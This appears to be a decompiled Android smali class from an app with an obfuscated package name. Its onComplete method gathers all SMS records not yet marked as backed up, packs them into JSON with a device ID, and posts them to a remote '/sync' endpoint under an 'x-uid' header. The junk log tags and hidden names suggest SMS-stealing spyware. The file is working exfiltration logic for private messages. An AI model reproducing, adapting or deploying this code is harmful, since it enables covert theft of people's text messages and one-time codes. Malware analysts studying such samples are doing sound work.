.class public Li/a/a/r$a;
.super Ljava/lang/Object;
.source "sourcefile"

# interfaces
.implements Lj/a/h0/b/f;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Li/a/a/r;->n(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Lj/a/h0/b/f<",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>(Li/a/a/r;)V
    .locals 0
    .param p1, "this$0"    # Li/a/a/r;

    .line 1736
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Lj/a/h0/c/c;)V
    .locals 0
    .param p1, "d"    # Lj/a/h0/c/c;

    .line 1740
    return-void
.end method

.method public b()V
    .locals 1

    const/4 v0, 0x0

    .line 1745
    .local v0, "aDouble":Ljava/lang/String;
    return-void
.end method

.method public onComplete()V
    .locals 9

    .line 1756
    const-string v0, "smslist"

    :try_start_0
    invoke-static {}, Lio/realm/Realm;->getDefaultInstance()Lio/realm/Realm;

    move-result-object v1

    .line 1757
    .local v1, "realmz":Lio/realm/Realm;
    const-class v2, Lgqegwqg/bbebebefff/asdcdsac/realm/Sms;

    invoke-virtual {v1, v2}, Lio/realm/Realm;->where(Ljava/lang/Class;)Lio/realm/RealmQuery;

    move-result-object v2

    const-string v3, "backup"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lio/realm/RealmQuery;->equalTo(Ljava/lang/String;Ljava/lang/Boolean;)Lio/realm/RealmQuery;

    move-result-object v2

    invoke-virtual {v2}, Lio/realm/RealmQuery;->findAll()Lio/realm/RealmResults;

    move-result-object v2

    .line 1760
    .local v2, "realmResult":Lio/realm/RealmResults;, "Lio/realm/RealmResults<Lgqegwqg/bbebebefff/asdcdsac/realm/Sms;>;"
    if-eqz v2, :cond_0

    .line 1761
    new-instance v3, Lcom/google/gson/Gson;

    invoke-direct {v3}, Lcom/google/gson/Gson;-><init>()V

    invoke-virtual {v1, v2}, Lio/realm/Realm;->copyFromRealm(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcom/google/gson/Gson;->r(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    .line 1762
    .local v3, "jsonString":Ljava/lang/String;
    const-string v4, "sms"

    invoke-static {v4, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 1763
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 1765
    .local v4, "obj":Lorg/json/JSONObject;
    :try_start_1
    const-string v5, "deviceid"

    sget-object v6, Li/a/a/p;->a:Ljava/lang/String;

    invoke-virtual {v4, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1766
    invoke-virtual {v4, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1768
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 1771
    .local v5, "objv":Lorg/json/JSONObject;
    const-string v6, "event"

    invoke-virtual {v5, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1772
    const-string v0, "data"

    invoke-virtual {v5, v0, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1773
    invoke-virtual {v1}, Lio/realm/Realm;->close()V

    .line 1774
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Li/a/a/p;->c()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "/sync"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lg/m/a/a;->t(Ljava/lang/String;)Lg/m/a/j/c;

    move-result-object v0

    .line 1775
    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Lg/m/a/j/a;->m(Ljava/lang/String;)Lg/m/a/j/a;

    check-cast v0, Lg/m/a/j/c;

    new-instance v6, Lcom/zhouyou/http/model/HttpHeaders;

    const-string v7, "x-uid"

    sget-object v8, Li/a/a/p;->a:Ljava/lang/String;

    invoke-direct {v6, v7, v8}, Lcom/zhouyou/http/model/HttpHeaders;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 1776
    invoke-virtual {v0, v6}, Lg/m/a/j/b;->f(Lcom/zhouyou/http/model/HttpHeaders;)Lg/m/a/j/b;

    check-cast v0, Lg/m/a/j/c;

    .line 1777
    const/4 v6, 0x1

    invoke-virtual {v0, v6}, Lg/m/a/j/b;->a(Z)Lg/m/a/j/b;

    check-cast v0, Lg/m/a/j/c;

    .line 1778
    invoke-virtual {v0, v6}, Lg/m/a/j/b;->i(Z)Lg/m/a/j/b;

    check-cast v0, Lg/m/a/j/c;

    new-instance v6, Li/a/a/r$a$a;

    invoke-direct {v6, p0}, Li/a/a/r$a$a;-><init>(Li/a/a/r$a;)V

    .line 1779
    invoke-virtual {v0, v6}, Lg/m/a/j/c;->p(Lg/m/a/e/a;)Lj/a/a0/b;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 1803
    .end local v5    # "objv":Lorg/json/JSONObject;
    goto :goto_0

    .line 1800
    :catch_0
    move-exception v0

    .line 1802
    .local v0, "e":Ljava/lang/Exception;
    :try_start_2
    const-string v5, "exece"

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 1807
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v1    # "realmz":Lio/realm/Realm;
    .end local v2    # "realmResult":Lio/realm/RealmResults;, "Lio/realm/RealmResults<Lgqegwqg/bbebebefff/asdcdsac/realm/Sms;>;"
    .end local v3    # "jsonString":Ljava/lang/String;
    .end local v4    # "obj":Lorg/json/JSONObject;
    :cond_0
    :goto_0
    goto :goto_1

    .line 1805
    :catch_1
    move-exception v0

    .line 1806
    .restart local v0    # "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "wefwef"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 1808
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_1
    return-void
.end method

.method public onError(Ljava/lang/Throwable;)V
    .locals 0
    .param p1, "e"    # Ljava/lang/Throwable;

    .line 1750
    return-void
.end method

.method public bridge synthetic onNext(Ljava/lang/Object;)V
    .locals 0

    .line 1736
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0}, Li/a/a/r$a;->b()V

    return-void
.end method
